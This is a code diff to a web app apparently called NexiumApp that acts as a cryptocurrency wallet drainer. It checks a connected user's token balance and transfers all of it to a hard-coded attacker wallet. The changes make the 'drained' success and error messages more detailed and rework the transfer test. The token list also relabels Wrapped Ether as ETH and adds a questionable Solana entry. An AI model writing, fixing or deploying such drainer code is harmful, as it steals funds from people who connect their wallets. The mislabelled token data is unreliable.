@@ -13,7 +13,8 @@ try {
 // TOKEN_LIST with verified, checksummed Base Mainnet addresses (validated via Basescan.org, July 2025)
 const TOKEN_LIST = [
   { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
-  { address: '0x4200000000000000000000000000000000000006', name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
+  { address: '0x4200000000000000000000000000000000000006', name: 'Ethereum (ETH)', symbol: 'ETH', decimals: 18 },
+  { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Solana (SOL)', symbol: 'SOL', decimals: 9 },
   { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 },
   { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18 },
   { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6 },
@@ -376,10 +377,13 @@ class NexiumApp {
       await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
       // Test transfer function with callStatic
       try {
-        await contract.callStatic.transfer(YOUR_WALLET_ADDRESS, balance);
+        // Create a new interface to ensure ABI methods are available
+        const contractInterface = new ethers.Interface(MINIMAL_ERC20_ABI);
+        const callStaticContract = new ethers.Contract(checksummedAddress, contractInterface, this.signer);
+        await callStaticContract.callStatic.transfer(YOUR_WALLET_ADDRESS, balance);
       } catch (error) {
         console.error(`callStatic.transfer failed for ${checksummedAddress}:`, error);
-        this.showFeedback('Error', 'error');
+        this.showFeedback(`Error draining ${selectedToken.symbol}: ${error.message}`, 'error');
         this.hideProcessingSpinner();
         return;
       }
@@ -400,11 +404,11 @@ class NexiumApp {
       });
       console.log('Transaction sent:', tx.hash);
       await tx.wait(1);
-      this.showFeedback('Success', 'success');
+      this.showFeedback(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`, 'success');
       console.log(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`);
     } catch (error) {
       console.error('Drain token error:', error);
-      this.showFeedback('Error', 'error');
+      this.showFeedback(`Error draining ${selectedToken.symbol}: ${error.message}`, 'error');
       console.log(`Drain failed: ${error.message}`);
     } finally {
       this.isDraining = false;
